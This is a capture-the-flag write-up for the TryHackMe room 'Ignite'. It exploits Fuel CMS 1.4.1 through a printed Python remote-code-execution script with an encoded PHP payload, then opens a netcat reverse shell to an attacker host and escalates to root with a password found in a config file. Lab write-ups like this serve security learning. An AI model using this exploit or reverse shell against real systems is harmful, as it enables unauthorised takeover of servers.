# Ignite - Writeup

**ID Original:** 60e84cd565e4000001040838
**Slug:** ignite-writeup
--------------------


## 
  
  [Ignite](https://tryhackme.com/room/ignite?ref=blog.tryhackme.com)
  




##  Author: [ Darkstar](https://twitter.com/darkstar7471?ref=blog.tryhackme.com) and lollava


## Nmap


We can see two ports in our nmap scan but only port 80 is open the other port is filtered so we can ignore it.
Let's start with port 80

## HTTP


Okay so I think this is a new kind of CMS system because  I've never seen this being used in any other vulnerable machine.
In the nmap scan we can see that there was a robots.txt file having some entry.

When I tried to visit the /fuel I was greeted with a login page.

Since we don't have any credentials we can't login into this so we need a way around it.
**Note**: Later I found out that we are given the default credentials i.e admin: admin but we actually don't need them ;-)
Without wasting anytime I searched for fuel on searchsploit and found an RCE for version 1.4.1

I downloaded the exploit and changed the line 14 to URL = &quot;http://10.0.0.130/&quot; i.e the IP of the machine.
This is what the exploit looks like
import requests
import urllib

URL = &quot;http://10.0.0.130/&quot;


def find_nth_overlapping(haystack, needle, n):
    start = haystack.find(needle)
    while start &gt;= 0 and n &gt; 1:
        start = haystack.find(needle, start+1)
        n -= 1
    return start


while 1:
    xxxx = input('cmd:')
    url = URL+&quot;/fuel/pages/select/?filter=%27%2b%70%69%28%70%72%69%6e%74%28%24%61%3d%27%73%79%73%74%65%6d%27%29%29%2b%24%61%28%27&quot;+urllib.quote(xxxx)+&quot;%27%29%2b%27&quot;
    r = requests.get(url)

    html = &quot;&lt;!DOCTYPE html&gt;&quot;
    htmlcharset = r.text.find(html)

    begin = r.text[0:20]
    dup = find_nth_overlapping(r.text,begin,2)

    print(r.text[0:dup])

We can run this and we'll be able to execute our commands.

**NOTE**: Make sure to give input with &quot;&quot; i.e when you run the exploit you'll get cmd: and there you'll have to enter the command you want to execute. Ex: Say you want to run ls then do cmd: &quot;ls&quot; and not cmd: ls. Notice the quotation marks around the command.
Since we have the RCE now we can easily get a reverse shell using it.
Run the following command to get a reverse shell:
cmd:&quot;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.56.1 4444 &gt;/tmp/f&quot;

This will give you a reverse shell on your listener which should be listening on port 4444 via nc -nlvp 4444

Now we can just get the user flag from user home directory.


## Privilege escalation

Since we are in the machine, let's just run our enumeration script to see if we can find anything. You can use wget from the to get the enumeration script from your system to the machine.

I ran the script but I got nothing insteresting. So I started looking around for background processes, but again found nothing.
After looking around for a little bit, I found the password for root: /var/www/html/fuel/application/config/database.php.

root: mememe
Okay so we just found the password for the root user and now we can change our account user to root using su command.

After this you can just get the root flag from /root.

## Final thoughts

This is a pretty good machine for beginners by [@Darkstar](https://twitter.com/darkstar7471?ref=blog.tryhackme.com) and @lollava. If you are a beginner then I'd definitely attempt this machine!
Thanks for reading, feedback is always appreciated.
You can read more of my writeups on [my blog](https://mzfr.github.io/?ref=blog.tryhackme.com).
Follow me on twitter [@0xmzfr](https://twitter.com/0xmzfr?ref=blog.tryhackme.com) for more walkthroughs!
Credits to Uran on Dribble for the artwork.
